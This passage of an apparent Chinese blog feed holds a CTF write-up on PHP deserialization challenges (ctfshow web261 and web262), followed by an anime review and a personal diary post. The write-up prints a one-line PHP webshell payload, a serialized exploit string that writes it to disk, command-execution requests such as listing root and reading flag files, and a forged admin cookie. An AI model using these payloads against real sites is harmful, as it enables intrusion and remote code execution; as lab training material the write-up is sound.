class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><p>成功拿到flag</p></li></ol><h1 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h1><ol><li>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure></li></ol><ul><li><p><code>__sleep()魔术方法</code><br>serialize() 函数会检查类中是否存在一个魔术方法 <code>__sleep()</code> 。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 null 被序列化，并产生一个 E_NOTICE 级别的错误。<br><code>__sleep()</code> 不能返回父类的私有成员的名字。这样做会产生一个 E_NOTICE 级别的错误。使用 <code>__serialize()</code> 接口替代。<br><code>__sleep()</code> 方法常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。</p></li><li><p><code>__wakeup()魔术方法</code><br>当使用 unserialize() 反序列化一个对象成功后，会自动调用该对象的 <code>__wakup()</code> 魔术方法。<br>该方法经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p></li><li><p><code>__unserialize()魔术方法</code><br>unserialize() 检查是否存在具有名为 <code>__unserialize()</code> 的魔术方法。此函数将会传递从 <code>__serialize()</code> 返回的恢复数组。然后它可以根据需要从该数组中恢复对象的属性。<br>注意:<br>如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略。<br>此特性自 PHP 7.4.0 起可用。</p></li><li><p><code>__invoke()魔术方法</code><br>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code> 方法会被自动调用。</p></li></ul><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">魔术方法</a></p><p>由于源码中同时存在 <code>__wakeup()</code> 和 <code>__unserialize()</code> ，因此首先查看php版本。<br>在 <code>Response Headers</code> 中可以看到 <code>X-Powered-By: PHP/7.4.16</code> ，于是只有 <code>__unserialize()</code> 方法会生效。<br>由于源码中的 <code>__invoke()</code> 方法没有调用，因此这个方法实际无用。<br>变量code的值实际为变量username与变量password之和。<br>最终，我们选择 <code>file_put_contents()</code> 函数作为终点，构造出一个php页面进去代码执行即可。</p><ol start="2"><li>构造payload<br>根据弱类型比较（&#x3D;&#x3D;），877.php&#x3D;&#x3D;877。于是username构造为877.php，password构造为一句话木马。<br>由此写出脚本如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>(<span class="string">&#x27;877.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>由于其中含有php代码，所以可能在页面上显示不全，可以查看源码复制序列化字符串。<br>将得到的序列化字符串构造为payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?vip=O:10:&quot;ctfshowvip&quot;:2:&#123;s:8:&quot;username&quot;;s:7:&quot;877.php&quot;;s:8:&quot;password&quot;;s:28:&quot;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>payload执行后，访问877.php页面，同时POST传参cmd&#x3D;phpinfo();<br>成功显示php页面，则代表执行成功，可以进行命令执行了。<br>接下来POST传参cmd&#x3D;system(‘ls &#x2F;‘);<br>继续POST传参：cmd&#x3D;system(‘cat &#x2F;flag*’);<br>成功拿到flag。</li></ol><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><ol><li>查看源码<br>初始页面：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>message.php页面<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过初始页面的注释，我们发现了message.php页面。<br>通过比较两个页面可以发现，只需要将变量msg的值序列化为字符串就可以拿到flag了。</p><ol start="2"><li>构造payload<br>先写一个简洁的脚本：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">message</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>得到的字符串在message.php页面通过Cookie传入。<br>成功拿到flag。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;开始刷反序列化的题咯~&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>孤独摇滚--忐忑不安的吉他英雄</title>
    <link href="http://example.com/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/"/>
    <id>http://example.com/2022/12/26/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A%E5%8A%A8%E7%94%BB/</id>
    <published>2022-12-25T16:00:00.000Z</published>
    <updated>2023-01-06T17:19:37.406Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/band_2.png" alt="band"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也许是今年看得最开心的新作动画。</p><h1 id="第一印象"><a href="#第一印象" class="headerlink" title="第一印象"></a>第一印象</h1><p>孤独摇滚是芳文社出版的四格漫画，老实说，虽然早就知道将要出动画，由于四格漫画画面太小，让人难以看进去，于是也就没有预先看漫画了。<br>看pv时，其实没有特别在意啦，只是预感会是一部还不错的动画，没想到最终大大超出预期，是一个很棒的惊喜~</p><h1 id="精妙的演出"><a href="#精妙的演出" class="headerlink" title="精妙的演出"></a>精妙的演出</h1><p>应当好好感谢制作组，如果中规中矩按照原作制作动画，大概会是中上水准，可却难以成为大多数人每周最期待的一部动画吧。<br>看动画时第一重要的是有趣，而动画也的确非常有趣，无论是在喜剧部分还是推动情节发展的地方都是“各司其职”，有条不紊。既不让人觉得混乱，也能看得十分开心。</p><ul><li><strong>创新性</strong><br>第1话运用的几个不同寻常的镜头很是吸引我：超广角，腿部运动镜头。这些对我来说都有一种新奇的美感。<br>不止如此，在乐队演奏方面也是不走寻常路，比如第8话十分重要的乐队演出，一般而言，这种重要的情景都会把其演奏过程制作得具有观赏性，而制作组明知这一点还是将一个很“烂”的live完全表现出来了。不得不说，虽然在演奏上是失败的，但如此大胆的策略让剧情更加自然，也一定会被很多人记住吧。</li><li><strong>想象力</strong><br>想象力是演出有趣与否的重要因素，在这方面，制作组拿出了：写实场景的水坝，3D建模，毕加索画作…一系列让人眼前一亮的元素，令人赞不绝口！</li><li><strong>契合度</strong><br>人物方面的契合度至少90%以上。波奇的声优甚至就是社恐，更是有一种声优与角色融为一体的感觉。我认为选择这样的声优比选知名声优好多了，无论一个声优多么有人气或是多么美丽，只要不适合，都应当一票否决。</li></ul><h1 id="观众的共鸣"><a href="#观众的共鸣" class="headerlink" title="观众的共鸣"></a>观众的共鸣</h1><p>本作在社恐方面做足了细节，这也直接导致了观众对这部作品产生强烈共鸣，将角色代入自身。虽然观众大多不会对社交完全恐惧，同样也不会完全外向。生活中的人们，多多少少有些社交上的恐惧感，尽管不如波奇，也只不过是层级不同罢了。<br>随便一举都有很多：期望别人主动和自己搭话、不敢直视别人、不会拒绝别人、不敢去人多的地方、穿着土气、弯腰驼背、害怕冒犯别人、团队协作能力较差、别人一夸赞自己就沾沾自喜或者觉得这个人是好人、没有外号、不会跟不熟的人打招呼、没有朋友、不敢一个人进店、想去没有同学认识自己的地方、独来独往、会进入自己的世界、无法打工、一个人吃饭、喜欢幻想、几个人说话的时候插不上嘴……细节太多怎也道不完。有些比较夸张，可这是喜剧，也没必要纠结了。<br>孤单与喜欢独处的人是不一样的。波奇是孤单的人，但凉是喜欢独处并且充满自信。我大概也是和凉更为相像吧。</p><h1 id="喜剧的剖析"><a href="#喜剧的剖析" class="headerlink" title="喜剧的剖析"></a>喜剧的剖析</h1><p>本作中主要出现的喜剧方面有，因波奇的内向而让她作出与常人不同的行为或想法而产生的反差造成的喜感，或是通过画面夸张化波奇的社恐心理（波奇融化，波奇变成赛博朋克，波奇变成恐龙等等），还有乐队四人不同个性的有趣小日常。</p><h1 id="乐队的成长"><a href="#乐队的成长" class="headerlink" title="乐队的成长"></a>乐队的成长</h1><p>波奇从一个害怕与人社交的高中生，最终成为乐队里不可或缺的一份子。中间也是一路艰辛啊。<br>第1阶段，无法与乐队成员在演奏上好好配合，无论什么事都很被动，也很害怕与人打交道，甚至无法在台上露脸演奏。（1话）<br>第2阶段，稍微变得主动了一些，也能够独自进店了，打工时勉强能直视顾客的眼睛。还是害怕与别人有所不同，一旦做了什么错事或没做到什么会害怕得不能自已，看到别人享受青春的样子会很难受，不敢与别人搭话。（2-7话）<br>第3阶段，配合变好了一些，乐队之间的关系更加亲密了。（8-12话）</p><p>喜多从第3话一个乐队外行人到了最终话演奏的时候也变得能够独自演奏一些片段了。</p><p>整个乐队从配合松散的四人慢慢变为了有默契的四人，一起打工，一起游玩，一起演奏，一起出行…四人一起更加有乐队的感觉了。</p><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>虽然只有短短12话，我却看得十分尽兴。<br>第5话，第8话，第12话这三段演奏都做得非常好，即便如此，还是有部分人不满，原因很简单，没有爆点。追求快的时代，拿不出一个爆点的话，那么是很难吸引快节奏人的目光的。从我个人的意愿来说，也不例外，希望有能够惊为天人的live。虽然没有期待到啦，不过也不至于成为挑刺的地方。三段演奏都是蛮棒的，写实的风格，创新的演出，越看越耐看的live，都是无可挑剔的。<br>最喜欢的角色嘛，是虹夏。现在虹夏已经被大家尊称为“下北泽の大天使”了hhh。<br>如果说我在四个人里最像凉，那么大概也能明白为什么一开始凉是和虹夏一起的了。若要问喜欢的原因，大概是那份细腻感吧，能够注意到乐队其他人不会注意到的事，而且还那么温柔，与喜多那种外向的阳光普照大地不同，虹夏的阳光是单独照射着她所在意的人的。还有也非常可爱啊，第5话最后那个告别怎能叫人不心动呢！<br><img src="/images/%E8%99%B9%E5%A4%8F_4.gif" alt="虹夏告别"></p><h1 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h1><p>赶紧出下一季！</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>动画评价写得好烂，还写了那么久，什么时候能写好一点啊！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/band_2.png&quot; alt=&quot;band&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="动画" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/"/>
    
    <category term="孤独摇滚" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A/"/>
    
    
    <category term="孤独摇滚" scheme="http://example.com/tags/%E5%AD%A4%E7%8B%AC%E6%91%87%E6%BB%9A/"/>
    
  </entry>
  
  <entry>
    <title>自由</title>
    <link href="http://example.com/2022/12/25/Diary_1225/"/>
    <id>http://example.com/2022/12/25/Diary_1225/</id>
    <published>2022-12-24T16:00:00.000Z</published>
    <updated>2022-12-25T18:30:52.068Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/Holo_2.png" alt="赫萝"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天看到qq音乐出了年度报告，虽然是一种典型的商业化行为，不过我倒是不怎么反感，能看到这一年里听音乐的变化，意味着感受到自己的变化，我想还是蛮有趣的。</p><h1 id="一年的音乐"><a href="#一年的音乐" class="headerlink" title="一年的音乐"></a>一年的音乐</h1><p>几个在意的数据：<br>年度关键词：<strong>自由</strong><br>年度歌曲：<strong>I Really Want to Stay at Your House</strong><br>年度歌手：<strong>Beyond</strong></p><p>从年度关键词看来看，“自由”并不是我嘴上说说而已呢hh，年度歌手一如既往，不出预料。<br>不过年度歌曲竟然是这首，看来无论是赛博朋克：边缘行者的动画，还是其歌曲，都给我带来很强的冲击力呢。<br>同时也侧面印证了我今年听音乐的集中度确实不多…</p><h1 id="自制力"><a href="#自制力" class="headerlink" title="自制力"></a>自制力</h1><p>有时，人并不是失去了自制力，而是没有找到真正想做的事。<br>人经常有这样的错觉，仿佛某件事做了一会儿，甚至还没开始，就放弃了，跑去娱乐。过去我常常认为这是缺乏自制力的表现，近来有了些不同的看法。<br>如果对于要做的这件事没有感觉甚至是抗拒的心理，强迫自己去做自然心理会有厌恶的想法。<br>没有热情也就没有动力。没有动力也就无法好好地完成它。相反，对于某件事如果充满热情，那我想，即便是想要偷懒的想法也不会滋生吧。<br>但是呢，只要活着，难免会有不想做却不得不做的事，一昧地想着“好不想做，好讨厌”以逃避的心态面对只会造成更难堪的局面，所以还是和解吧，至少不要调整好心态。<br>趁着还有能够充满热情的事物，全力去做吧~</p><h1 id="失去了看动漫的热情？"><a href="#失去了看动漫的热情？" class="headerlink" title="失去了看动漫的热情？"></a>失去了看动漫的热情？</h1><p>最近除了几部最近的新番不怎么看更多的动漫了，反而看起了以前看过的K-ON, Spice and Wolf…<br>是因为失去了尝试看新动漫的热情了吗？<br>人就是有这样的时候啊，也听说一些人曾经看很多anime，也慢慢不去看了。我想也许我正处于这个过程中。<br>不过我却不想失去这样的热情，哪怕是强迫自己，也要重拾那份快乐。<br>想到这，电视剧电影年复一年的出新，会不会有人也对其不再感冒呢，大概是有的吧。<br>人会对什么终其一生充满着热情呢？</p><h1 id="圣诞节"><a href="#圣诞节" class="headerlink" title="圣诞节"></a>圣诞节</h1><p>从何时开始，有了所谓不过“洋节”的说法呢？<br>我印象是2015年左右吧，那时开始产生了这样的说法。缘由是所谓的防止“文化入侵”，那时我不甚明白。<br>目的确实达到了，曾经在圣诞节这天，很多人都会互相祝福圣诞快乐，苹果以及其它节日的小玩意儿的卖价在这段日子也是连连攀升。而如今，大陆再没多少人在这天互相祝福了，甚至这样说的话，反而会显得怪尴尬的（比如我）。<br>不过今天的我，在增加了一点点阅历后，觉得这样做实属愚昧。好的文化自然广泛传播，以文化入侵的名义禁止也不能改变自身没有文化的现状。</p><h1 id="国与国的对比"><a href="#国与国的对比" class="headerlink" title="国与国的对比"></a>国与国的对比</h1><p>一直觉得日本与中国拿来对比是非常恰当的，距离很近，同处东亚，人口密度也很高，同样在二战中经历了巨大的创伤，文化方面也有许多相似之处。<br>结论是，我认为日本完胜中国。<br>这样的话，如果被放到其它地方，恐怕会被人一口唾沫淹死吧，不过嘛，在自己的领地上，我想怎么说怎么说，我才不管别人怎么想。<br>简单讨论几个对比的地方，</p><ol><li><p>人均<br>曾经听过很多这样的话，虽然中国地大物博，但是有很多荒地沙漠不能使用，人口密度大，所以是很多问题的原因啦之类的。<br>人口密度 每平方公里人数<br>中国 145<br>日本 344<br>如此看来，日本是中国人口密度的两倍有余，人均GDP依然远高于中国，我想，从这方面看来，人口密度大并非是很多问题的真正原因，恐怕只是一种托词罢了。或许有质疑声是中国的领土如此大，管理很困难，那么根据数据：<br>中国官民比例1：18<br>日本官民比例1：28<br>有如此多的人管理着平民，我想不应当再谈管理困难的事。<br>从这方面的话，中国人均GDP低另有他因，但我这里不想再讨论了。</p></li><li><p>文化<br>日本没有禁“洋节”，而自己的文化依然欣欣向荣，甚至传播到其它国家。<br>现代文化方面，日本动画漫画游戏等等，都是世界知名的，从中国的角度来说，这就是对其它国家“文化入侵”。而日本人也没有排斥这些洋节，圣诞依然张灯结彩。<br>中国的现代文化，我说的尖锐点，中国压根儿没什么现代文化。影视动画除了会把各朝各代或是神话故事之类的拿出来翻拍改编，也没什么花样了。啊对了，近几年倒是又新起红色影视剧，什么战狼2啊，长津湖啊…大概也就这样了吧。科幻方面只有少数如刘慈欣的《三体》在中国赞美连连，可最近的三体动画在某评分平台上仅有3分，也是沦为笑话了。小说漫画常年排在榜单里的不是什么后宫言情就是开挂修仙玄幻之类的垃圾玩意儿。差点忘了游戏方面，腾讯网易永远都被人骂不完，也永远赚得盆满钵满。做的那些狗屁东西除了在不是“封”就是“禁”的中国大陆能搞得火热之外，到了外面根本就没有市场。<br>一说起来就成了发泄情绪的话呢。还是收一收。总之，影视动画，小说漫画和游戏等软文化的东西，都能影响一个国家，大众整体的审美能力。不如说，也是体现了大众的审美能力。在我看来，如今的大陆民众，审美能力低下，和日本起码差了好几个level。可悲吗？可悲。但我再怎么担心也没用，就这样吧。<br>他们总是这样：没有什么，就要宣扬什么；掩饰什么，就要封禁什么。</p></li></ol><p>很多中国人不愿承认自己国家的缺陷，每次谈到不足糟糕的地方，通常会有以下几种反应：</p><ul><li>不承认。只要不是把确凿无疑的事实证据摆在他面前，总是会发出怀疑的声音，想以此来否定，不承认其糟糕。</li><li>别的国家也没做好&#x2F;也这样。当他对铁证如山的事实无可辩驳时，就开始逃避，说某某国家也这样啊，某某国家也没做得多好。</li><li>总说得好像没办法了似的或某某有其它的考虑。总是把某件事做得很糟糕归咎于外因，从不会反省自身没做好的地方。总是把一些糟糕的结果认为某官员某部门有他的“考虑”，经典话语之“下大棋”。</li><li>太过激了。终于以上所有退路都没堵住后，面对批判，又会有人冒出来说，“说得太过激了”，“虽然…是没错，但也不至于这么说吧”。我只觉搞笑，当这些人面对他们老师，他们领导这种，被痛骂一顿的时候他们敢还嘴说“太过激了”吗？怎么？只有上位者具有随心所欲批评的权利吗？作为遵纪守法的纳税人，连没做好都没资格说了吗？</li></ul><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天一时来了兴致，写了这么久，写了一堆痛骂的话…既然写过一次了，以后尽可能少写。<br>早睡计划又失败了&#x2F;(ㄒoㄒ)&#x2F;~~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Holo_2.png&quot; alt=&quot;赫萝&quot;&gt;&lt;/p&gt;</summary>
    
    
    
